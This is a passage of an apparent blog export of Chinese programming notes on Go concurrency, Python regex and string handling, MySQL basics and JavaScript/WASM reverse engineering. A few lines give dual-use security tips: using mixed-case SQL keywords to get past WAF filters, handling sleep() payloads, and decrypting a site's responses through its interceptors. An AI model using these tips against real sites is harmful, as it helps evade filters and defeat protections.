<td>结构体比较</td>
<td><code>cmp:&quot;ignore&quot;</code></td>
<td><code>github.com/google/go-cmp</code></td>
</tr>
</tbody>
</table>
<h2 id="13go协程goroutine"><a class="markdownIt-Anchor" href="#13go协程goroutine"></a> 13.go协程(goroutine):</h2>
<h3 id="1基础用法"><a class="markdownIt-Anchor" href="#1基础用法"></a> 1.基础用法:</h3>
<table>
<thead>
<tr>
<th>用法场景</th>
<th>语法</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>启动协程</td>
<td><code>go 函数名()</code></td>
<td><code>go doWork()</code></td>
</tr>
<tr>
<td>匿名函数协程</td>
<td><code>go func()&#123;...&#125;()</code></td>
<td><code>go func()&#123; fmt.Println(&quot;Hi&quot;) &#125;()</code></td>
</tr>
<tr>
<td>协程同步</td>
<td><code>sync.WaitGroup</code></td>
<td>用于等待所有协程完成</td>
</tr>
<tr>
<td>协程通信</td>
<td><code>chan</code> 通道</td>
<td><code>ch := make(chan int)</code>，用于发送/接收数据</td>
</tr>
<tr>
<td>协程超时</td>
<td><code>select + time.After</code></td>
<td>处理阻塞操作的超时控制</td>
</tr>
</tbody>
</table>
<h3 id="2注意事项"><a class="markdownIt-Anchor" href="#2注意事项"></a> 2.注意事项:</h3>
<table>
<thead>
<tr>
<th>注意点</th>
<th>原因</th>
</tr>
</thead>
<tbody>
<tr>
<td>不要在 goroutine 中访问共享变量（需加锁或使用 channel）</td>
<td>避免数据竞争（data race）</td>
</tr>
<tr>
<td>主程序要等待协程完成，否则程序会提前退出</td>
<td>使用 <code>sync.WaitGroup</code></td>
</tr>
<tr>
<td>不要忘记 <code>wg.Done()</code>，否则会死锁</td>
<td><code>wg.Wait()</code> 永远不会结束</td>
</tr>
<tr>
<td>大量协程可用 <code>GOMAXPROCS</code> 控制核心数</td>
<td><code>runtime.GOMAXPROCS(n)</code></td>
</tr>
</tbody>
</table>
<h2 id="14管道channel"><a class="markdownIt-Anchor" href="#14管道channel"></a> 14管道(channel):</h2>
<h3 id="1基本使用"><a class="markdownIt-Anchor" href="#1基本使用"></a> 1.基本使用:</h3>
<table>
<thead>
<tr>
<th>概念</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>创建通道</td>
<td>用 <code>make(chan 类型)</code> 创建</td>
<td><code>ch := make(chan int)</code></td>
</tr>
<tr>
<td>发送数据</td>
<td>使用 <code>&lt;-</code> 向通道发送值</td>
<td><code>ch &lt;- 10</code></td>
</tr>
<tr>
<td>接收数据</td>
<td>从通道中读取值</td>
<td><code>val := &lt;-ch</code></td>
</tr>
<tr>
<td>无缓冲通道</td>
<td>发送时必须等待接收方</td>
<td><code>ch := make(chan int)</code></td>
</tr>
<tr>
<td>有缓冲通道</td>
<td>可存储一定数量数据</td>
<td><code>ch := make(chan int, 3)</code></td>
</tr>
<tr>
<td>关闭通道</td>
<td>表示不会再发送数据</td>
<td><code>close(ch)</code></td>
</tr>
<tr>
<td><code>for range</code> 读取</td>
<td>读取所有通道数据直到关闭</td>
<td><code>for v := range ch &#123;...&#125;</code></td>
</tr>
</tbody>
</table>
<h3 id="2与select使用"><a class="markdownIt-Anchor" href="#2与select使用"></a> 2.与select使用:</h3>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">done通道可以看作一个空结构体，不占用内存<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>使用模式</th>
<th>示例代码片段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>接收多个通道数据</td>
<td><code>select &#123; case v := &lt;-ch1: ... case v := &lt;-ch2: ... &#125;</code></td>
<td>等待多个输入，哪个先来就处理哪个</td>
</tr>
<tr>
<td>超时控制</td>
<td><code>select &#123; case &lt;-ch: ... case &lt;-time.After(t): ... &#125;</code></td>
<td>避免 goroutine 永远阻塞</td>
</tr>
<tr>
<td>退出信号监听</td>
<td><code>select &#123; case &lt;-data: ... case &lt;-done: return &#125;</code></td>
<td>通过 <code>done</code> 通道优雅退出</td>
</tr>
<tr>
<td>非阻塞 send/recv</td>
<td><code>select &#123; case ch &lt;- val: ... default: ... &#125;</code></td>
<td>如果通道阻塞就执行 default</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>基础语言</category>
        <category>golang</category>
      </categories>
  </entry>
  <entry>
    <title>爬虫</title>
    <url>/2025/09/23/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/python/%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h1>python用法:</h1>
<h2 id="1-切片">1.切片:</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">切片是 Python 提供的一种用于提取序列（字符串、列表、元组等）子集的机制。它允许你通过 起始索引、结束索引、步长 来访问序列中的元素。</span><br></pre></td></tr></table></figure>
<h3 id="1-切片的基本格式">1.切片的基本格式:</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s[start:stop:step]</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>start</code></td>
<td>起始索引（包含）</td>
</tr>
<tr>
<td><code>stop</code></td>
<td>结束索引（不包含）</td>
</tr>
<tr>
<td><code>step</code></td>
<td>步长（间隔），可以是负数</td>
</tr>
</tbody>
</table>
<h3 id="2-可切片序列类型">2.可切片序列类型:</h3>
<table>
<thead>
<tr>
<th>类型</th>
<th>是否支持切片</th>
</tr>
</thead>
<tbody>
<tr>
<td>字符串</td>
<td>✅ 支持</td>
</tr>
<tr>
<td>列表</td>
<td>✅ 支持</td>
</tr>
<tr>
<td>元组</td>
<td>✅ 支持</td>
</tr>
<tr>
<td>NumPy 数组</td>
<td>✅ （并支持多维切片）</td>
</tr>
<tr>
<td>自定义类</td>
<td>✅ 只要实现 <code>__getitem__</code></td>
</tr>
</tbody>
</table>
<h2 id="2-re模块">2.re模块;</h2>
<h3 id="1-基础用法">1.基础用法:</h3>
<table>
<thead>
<tr>
<th>函数</th>
<th>用途</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>re.search()</code></td>
<td>匹配<strong>一个</strong>符合的</td>
<td><code>re.search(r'flag&#123;.*&#125;', s)</code></td>
</tr>
<tr>
<td><code>re.findall()</code></td>
<td>返回<strong>所有</strong>匹配内容</td>
<td><code>re.findall(r'\d+', s)</code></td>
</tr>
<tr>
<td><code>re.sub()</code></td>
<td>替换匹配项</td>
<td><code>re.sub(r'sleep\([^)]+\)', '1', payload)</code></td>
</tr>
<tr>
<td><code>re.match()</code></td>
<td>匹配开头（从头匹配）</td>
<td><code>re.match(r'^GET', line)</code></td>
</tr>
<tr>
<td><code>re.split()</code></td>
<td>正则分割字符串</td>
<td><code>re.split(r'\s+', s)</code></td>
</tr>
<tr>
<td><code>re.compile()</code></td>
<td>编译正则对象</td>
<td><code>r = re.compile(r'sleep\(\d+\)')</code></td>
</tr>
</tbody>
</table>
<h3 id="2-正则表达式">2.正则表达式;</h3>
<table>
<thead>
<tr>
<th>表达式</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>.</code></td>
<td>任意字符（不包括换行）</td>
<td><code>a.b</code> 匹配 <code>acb</code>, <code>arb</code></td>
</tr>
<tr>
<td><code>*</code></td>
<td>重复0次或多次</td>
<td><code>.*</code> 匹配任意字符串</td>
</tr>
<tr>
<td><code>+</code></td>
<td>重复1次或多次</td>
<td><code>\d+</code> 匹配 <code>123</code></td>
</tr>
<tr>
<td><code>?</code></td>
<td>0或1次（或非贪婪）</td>
<td><code>.*?</code> 匹配最短字符串</td>
</tr>
<tr>
<td><code>[...]</code></td>
<td>字符集</td>
<td><code>[0-9]</code> 匹配数字</td>
</tr>
<tr>
<td><code>[^...]</code></td>
<td>非字符集</td>
<td><code>[^A-Z]</code> 非大写字母</td>
</tr>
<tr>
<td><code>\d</code></td>
<td>数字（等价于 [0-9]）</td>
<td><code>\d&#123;4&#125;</code> 匹配4位数</td>
</tr>
<tr>
<td><code>\w</code></td>
<td>单词字符（字母数字下划线）</td>
<td><code>\w+</code> 匹配变量名</td>
</tr>
<tr>
<td><code>\s</code></td>
<td>空白字符</td>
<td><code>\s+</code> 匹配任意空格、换行</td>
</tr>
<tr>
<td><code>^</code></td>
<td>行首</td>
<td><code>^flag</code> 以 flag 开头</td>
</tr>
<tr>
<td><code>$</code></td>
<td>行尾</td>
<td><code>abc$</code> 以 abc 结尾</td>
</tr>
<tr>
<td>`</td>
<td>`</td>
<td>或</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left">简写旗标</th>
<th>完整常量</th>
<th>黑客视角用途 / 功能说明</th>
<th>常见攻击场景</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>re.I</code></td>
<td><code>re.IGNORECASE</code></td>
<td>忽略大小写，匹配更宽松</td>
<td>绕过大小写 WAF 关键词过滤 (<code>SeLeCt</code>, <code>UnIoN</code>)</td>
</tr>
<tr>
<td style="text-align:left"><code>re.S</code></td>
<td><code>re.DOTALL</code></td>
<td>让 <code>.</code> 匹配换行，跨行抓取大块 Payload</td>
<td>抓多行注入语句、跨标签 XSS 片段</td>
</tr>
<tr>
<td style="text-align:left"><code>re.M</code></td>
<td><code>re.MULTILINE</code></td>
<td><code>^</code>/<code>$</code> 从<strong>行</strong>首尾而非全文首尾匹配</td>
<td>分析多行日志，一行一行定位恶意请求</td>
</tr>
<tr>
<td style="text-align:left"><code>re.X</code></td>
<td><code>re.VERBOSE</code></td>
<td>正则可加空格、换行、注释，团队协作易读</td>
<td>写复杂匹配规则（SQLMap 策略等）时避免维护地狱</td>
</tr>
<tr>
<td style="text-align:left"><code>re.A</code></td>
<td><code>re.ASCII</code></td>
<td><code>\w</code> <code>\d</code> 限定为 ASCII，防宽字节/Unicode 绕过</td>
<td>过滤混入全角/零宽字符的绕过 Payload</td>
</tr>
</tbody>
</table>
<h3 id="3-批量化compile正则对象">3.批量化compile正则对象:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MAP=&#123;</span><br><span class="line">&quot;字段&quot;:&#x27;r&quot;这里写正则表达式&quot;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">for k,v in MAP.items()    ---对字典键值对分别拿出来</span><br><span class="line">   Regula=&#123;</span><br><span class="line">   k:re.compile(&quot;v&quot;,re.S)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-切除strip-去掉首尾">3.切除strip()去掉首尾</h2>
<table>
<thead>
<tr>
<th>#</th>
<th style="text-align:left">关键词</th>
<th>作用</th>
<th>典型用法</th>
<th>CTF/安全思维提醒</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td style="text-align:left"><code>strip()</code></td>
<td>去掉<strong>首尾空白字符</strong> (空格、<code>\t\n\r\x0b\x0c</code>)</td>
<td><code>s.strip()</code></td>
<td>过滤日志/报文首尾垃圾数据</td>
</tr>
<tr>
<td>2</td>
<td style="text-align:left"><code>strip(chars)</code></td>
<td>去掉首尾 <strong>chars 内任意字符</strong></td>
<td>`cmd.strip(';</td>
<td>&amp; ')`</td>
</tr>
<tr>
<td>3</td>
<td style="text-align:left"><code>lstrip()</code> / <code>rstrip()</code></td>
<td>仅去左 / 右侧</td>
<td><code>user.lstrip('0')</code></td>
<td>解析手机号/前导 0</td>
</tr>
<tr>
<td>4</td>
<td style="text-align:left">与 <code>bytes.strip()</code></td>
<td>处理二进制</td>
<td><code>payload.strip(b'\x00')</code></td>
<td>阻断基于 NULL 字节的解析差异</td>
</tr>
<tr>
<td>5</td>
<td style="text-align:left">与 <code>removeprefix/suffix</code></td>
<td><strong>精确</strong>去前缀/后缀，3.9+</td>
<td><code>url.removesuffix('/')</code></td>
<td>避免 <code>strip('/')</code> 误删中间斜杠</td>
</tr>
</tbody>
</table>
<h2 id="4-逻辑与逻辑或">4.逻辑与逻辑或:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">any(iterable)        # iterable 可以是列表、元组、集合、生成器、文件迭代器…… </span><br><span class="line">              ---出现任意一个即可返回true</span><br><span class="line">all()     ---逻辑与</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>基础语言</category>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>mysql具体用法</title>
    <url>/2025/10/12/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/sql/mysql%E5%85%B7%E4%BD%93%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h1 id="sql具体用法"><a class="markdownIt-Anchor" href="#sql具体用法"></a> sql具体用法</h1>
<h2 id="启动及关闭-mysql-服务器"><a class="markdownIt-Anchor" href="#启动及关闭-mysql-服务器"></a> 启动及关闭 MySQL 服务器</h2>
<p><strong>启动 MySQL 服务器:</strong></p>
<p><strong>1、通过 “服务” 管理工具：</strong> 打开&quot;运行&quot;对话框（Win + R），输入 <strong>services.msc</strong>，找到&quot;MySQL&quot;服务，右击选择&quot;启动&quot;。</p>
<p><strong>2、通过命令提示符：</strong> 打开命令提示符（以管理员身份），输入以下命令：</p>
<p>​      <code>net start mysql</code></p>
<p><strong>关闭MySQL服务器:</strong></p>
<p>1、**通过 “服务” 管理工具：**同样打开&quot;运行&quot;对话框，输入 services.msc，找到 “MySQL” 服务，右击选择&quot;停止&quot;。</p>
<p>2、<strong>通过命令提示符：</strong> 打开命令提示符（以管理员身份），输入以下命令：<br />
​      <code>net stop mysql</code></p>
<h2 id="连接mysql"><a class="markdownIt-Anchor" href="#连接mysql"></a> 连接mysql</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>P <span class="number">3307</span> <span class="operator">-</span>u 用户名 <span class="operator">-</span>p</span><br></pre></td></tr></table></figure>
<h2 id="基本的sql语句分类"><a class="markdownIt-Anchor" href="#基本的sql语句分类"></a> <strong>基本的sql语句分类</strong></h2>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127150805234.png" alt="image-20241127150805234" /></p>
<h3 id="ddl中的操作-对表数据库进行定义"><a class="markdownIt-Anchor" href="#ddl中的操作-对表数据库进行定义"></a> DDl中的操作–&gt; 对表数据库进行定义</h3>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127151543554.png" alt="image-20241127151543554" /></p>
<h4 id="对表操作"><a class="markdownIt-Anchor" href="#对表操作"></a> <strong>对表操作</strong></h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127153029331.png" alt="image-20241127153029331" /></p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127153341985.png" alt="image-20241127153341985" /></p>
<p>​         <em><strong>在字段类型后面可以添加约束</strong></em></p>
<h4 id="数据类型"><a class="markdownIt-Anchor" href="#数据类型"></a> 数据类型</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127154845020.png" alt="image-20241127154845020" /></p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127155317059.png" alt="image-20241127155317059" /></p>
<p>char–&gt;定长 效率好，但是占用空间</p>
<p>warchar–&gt;不定长 效率低，空间占用低</p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127155709186.png" alt="image-20241127155709186" /></p>
<h4 id="修改表的操作"><a class="markdownIt-Anchor" href="#修改表的操作"></a> 修改表的操作</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127155958737.png" alt="image-20241127155958737" /></p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127160049495.png" alt="image-20241127160049495" /></p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241127160100466.png" alt="image-20241127160100466" /></p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241128111814871.png" alt="image-20241128111814871" /></p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241128111917721.png" alt="image-20241128111917721" /></p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241128112001285.png" alt="image-20241128112001285" /></p>
<h3 id="dml中的操作对数据表中数据进行操作"><a class="markdownIt-Anchor" href="#dml中的操作对数据表中数据进行操作"></a> DML中的操作–&gt;对数据表中数据进行操作</h3>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241128112617668.png" alt="image-20241128112617668" /></p>
<h4 id="添加数据"><a class="markdownIt-Anchor" href="#添加数据"></a> 添加数据</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241128112950489.png" alt="image-20241128112950489" /></p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241128113019169.png" alt="image-20241128113019169" /></p>
<h4 id="修改数据"><a class="markdownIt-Anchor" href="#修改数据"></a> 修改数据</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130103630872.png" alt="image-20241130103630872" /></p>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130104248875.png" alt="image-20241130104248875" /></p>
<h3 id="dql查询数据"><a class="markdownIt-Anchor" href="#dql查询数据"></a> DQL–&gt;查询数据</h3>
<h4 id="编写顺序"><a class="markdownIt-Anchor" href="#编写顺序"></a> 编写顺序</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130104603830.png" alt="image-20241130104603830" /></p>
<h4 id="执行顺序"><a class="markdownIt-Anchor" href="#执行顺序"></a> 执行顺序</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130123553434.png" alt="image-20241130123553434" /></p>
<h4 id="基本查询"><a class="markdownIt-Anchor" href="#基本查询"></a> 基本查询</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130104753477.png" alt="image-20241130104753477" /></p>
<h4 id="条件查询"><a class="markdownIt-Anchor" href="#条件查询"></a> 条件查询</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130105327034.png" alt="image-20241130105327034" /></p>
<h4 id="聚合函数"><a class="markdownIt-Anchor" href="#聚合函数"></a> 聚合函数</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130110601437.png" alt="image-20241130110601437" /></p>
<h4 id="分组查询"><a class="markdownIt-Anchor" href="#分组查询"></a> 分组查询</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130111322453.png" alt="image-20241130111322453" /></p>
<h4 id="排序查询"><a class="markdownIt-Anchor" href="#排序查询"></a> 排序查询</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130112858930.png" alt="image-20241130112858930" /></p>
<h4 id="分页查询"><a class="markdownIt-Anchor" href="#分页查询"></a> 分页查询</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130113737559.png" alt="image-20241130113737559" /></p>
<h3 id="dcl管理数据库用户和控制数据库的权限"><a class="markdownIt-Anchor" href="#dcl管理数据库用户和控制数据库的权限"></a> DCL–&gt;管理数据库用户和控制数据库的权限</h3>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130124231606.png" alt="image-20241130124231606" /></p>
<h4 id="管理用户"><a class="markdownIt-Anchor" href="#管理用户"></a> 管理用户</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130125055858.png" alt="image-20241130125055858" /></p>
<h4 id="权限控制"><a class="markdownIt-Anchor" href="#权限控制"></a> 权限控制</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130125810247.png" alt="image-20241130125810247" /></p>
<h5 id="权限说明"><a class="markdownIt-Anchor" href="#权限说明"></a> 权限说明</h5>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130125143284.png" alt="image-20241130125143284" /></p>
<h2 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h2>
<h3 id="基本说明"><a class="markdownIt-Anchor" href="#基本说明"></a> 基本说明</h3>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130130121824.png" alt="image-20241130130121824" /></p>
<h3 id="内置函数"><a class="markdownIt-Anchor" href="#内置函数"></a> 内置函数</h3>
<h4 id="字符串函数"><a class="markdownIt-Anchor" href="#字符串函数"></a> 字符串函数</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130131020590.png" alt="image-20241130131020590" /></p>
<h4 id="数值函数"><a class="markdownIt-Anchor" href="#数值函数"></a> 数值函数</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130131408126.png" alt="image-20241130131408126" /></p>
<h4 id="日期函数"><a class="markdownIt-Anchor" href="#日期函数"></a> 日期函数</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130131536381.png" alt="image-20241130131536381" /></p>
<h4 id="流程控制函数"><a class="markdownIt-Anchor" href="#流程控制函数"></a> 流程控制函数</h4>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241130131812064.png" alt="image-20241130131812064" /></p>
<h2 id="约束"><a class="markdownIt-Anchor" href="#约束"></a> 约束</h2>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241203164917483.png" alt="image-20241203164917483" /></p>
<h3 id="外键"><a class="markdownIt-Anchor" href="#外键"></a> 外键</h3>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241203170935172.png" alt="image-20241203170935172" /></p>
]]></content>
      <categories>
        <category>基础语言</category>
        <category>sql</category>
      </categories>
  </entry>
  <entry>
    <title>常用方法</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/JS_%E9%80%86%E5%90%91/%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="1对回显数据的解密"><a class="markdownIt-Anchor" href="#1对回显数据的解密"></a> 1.对回显数据的解密:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">对于回显数据解密，大概率通过拦截器实现，搜索interceptors</span><br></pre></td></tr></table></figure>
<h2 id="2py和js的联用"><a class="markdownIt-Anchor" href="#2py和js的联用"></a> 2.py和js的联用:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> execjs    ---库</span><br><span class="line"></span><br><span class="line">file=<span class="string">&quot;解密.js&quot;</span></span><br><span class="line">ctx = execjs.<span class="title function_">compile</span>(<span class="title function_">open</span>(file).<span class="title function_">read</span>())</span><br><span class="line">ctx.<span class="title function_">call</span>(js函数,参数)</span><br></pre></td></tr></table></figure>
<h2 id="3导出数组"><a class="markdownIt-Anchor" href="#3导出数组"></a> 3.导出数组:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = _$UH;     ---导出数组</span><br><span class="line">其他的文件里使用:</span><br><span class="line"><span class="keyword">const</span> _$UH = <span class="built_in">require</span>(<span class="string">&quot;./_$UH.js&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(_$UH[<span class="number">0x1f</span>]);  <span class="comment">// 直接用</span></span><br></pre></td></tr></table></figure>
<h2 id="4wasm的方式"><a class="markdownIt-Anchor" href="#4wasm的方式"></a> 4.WASM的方式:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">.<span class="property">wasm</span> 文件就是 <span class="title class_">WebAssembly</span> 的二进制包，里面封装了函数、变量和导出接口。</span><br><span class="line"><span class="title class_">WebAssembly</span> (<span class="variable constant_">WASM</span>) 是一种低级字节码格式，可以在浏览器和其他环境里运行。</span><br><span class="line">模块 (<span class="title class_">Module</span>) 是 <span class="variable constant_">WASM</span> 的基本单位，本质上就是一个 .<span class="property">wasm</span> 文件。</span><br><span class="line">一个模块可以包含：</span><br><span class="line">    函数 (functions)</span><br><span class="line">    全局变量 (globals)</span><br><span class="line">    内存 (memory)</span><br><span class="line">    表 (tables, 主要是函数指针表)</span><br><span class="line">    导入/导出接口 (imports/<span class="built_in">exports</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">WebAssembly</span>.<span class="property">instantiateStreaming</span>     <span class="title class_">WebAssembly</span>.<span class="property">instantiate</span>     <span class="title class_">WebAssembly</span>.<span class="property">Instance</span>   instance.<span class="property">exports</span></span><br></pre></td></tr></table></figure>
<h3 id="1python的利用"><a class="markdownIt-Anchor" href="#1python的利用"></a> 1.python的利用:</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">在不需要环境的情况下</span><br><span class="line"><span class="keyword">for</span> i, imp <span class="keyword">in</span> <span class="built_in">enumerate</span>(module.imports):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>: module=&#x27;<span class="subst">&#123;imp.module&#125;</span>&#x27;, name=&#x27;<span class="subst">&#123;imp.name&#125;</span>&#x27;, type=<span class="subst">&#123;imp.<span class="built_in">type</span>&#125;</span>&quot;</span>)             </span><br><span class="line">                                <span class="comment">#查看需要哪些模块  只有当不需要环境才能这样使用</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> wasmtime <span class="keyword">import</span> Store, Module, Instance, Engine</span><br><span class="line"></span><br><span class="line">engine = Engine()                       <span class="comment"># 1. 创建编译引擎</span></span><br><span class="line">store = Store(engine)                   <span class="comment"># 2. 运行环境</span></span><br><span class="line">module = Module(engine, <span class="built_in">open</span>(<span class="string">&quot;a.wasm&quot;</span>,<span class="string">&quot;rb&quot;</span>).read())   <span class="comment"># 3. 加载wasm模块</span></span><br><span class="line">instance = Instance(store, module, [])  <span class="comment"># 4. 实例化模块</span></span><br><span class="line"><span class="keyword">for</span> i, imp <span class="keyword">in</span> <span class="built_in">enumerate</span>(module.imports):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>: module=&#x27;<span class="subst">&#123;imp.module&#125;</span>&#x27;, name=&#x27;<span class="subst">&#123;imp.name&#125;</span>&#x27;, type=<span class="subst">&#123;imp.<span class="built_in">type</span>&#125;</span>&quot;</span>)             </span><br><span class="line">                                <span class="comment">#查看需要哪些模块  只有当不需要环境才能这样使用</span></span><br><span class="line">exports = instance.exports(store)       <span class="comment"># 5. 拿到所有导出</span></span><br><span class="line"><span class="built_in">print</span>(exports)                          <span class="comment"># &#123;&#x27;encode&#x27;: &lt;Func&gt;, ...&#125;</span></span><br><span class="line">encode = exports[<span class="string">&quot;encode&quot;</span>]              <span class="comment"># 取出encode函数</span></span><br><span class="line"><span class="built_in">print</span>(encode(store, <span class="number">1</span>, <span class="number">2</span>))              <span class="comment"># 调用encode(1,2)，得到结果</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="2有模块的情况"><a class="markdownIt-Anchor" href="#2有模块的情况"></a> 2.有模块的情况:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">async <span class="function"><span class="keyword">function</span> <span class="title">get_func</span>(<span class="params"></span>)</span>&#123;  通常都是异步加载</span><br><span class="line">    <span class="keyword">return</span> WebAssembly.<span class="title function_ invoke__">instantiate</span>(fs.<span class="title function_ invoke__">readFileSync</span>(<span class="string">&quot;wasm.wasm&quot;</span>),wasmImportObjects).<span class="title function_ invoke__">then</span>((results)=&gt;&#123;</span><br><span class="line">        let instance=results.instance                            关键是这个模块</span><br><span class="line">        Export=instance.exports;    <span class="comment">///导出模块</span></span><br><span class="line">        flag=<span class="number">1</span>     <span class="comment">///异步情况下做同步await</span></span><br><span class="line">    &#125;)</span><br><span class="line"> 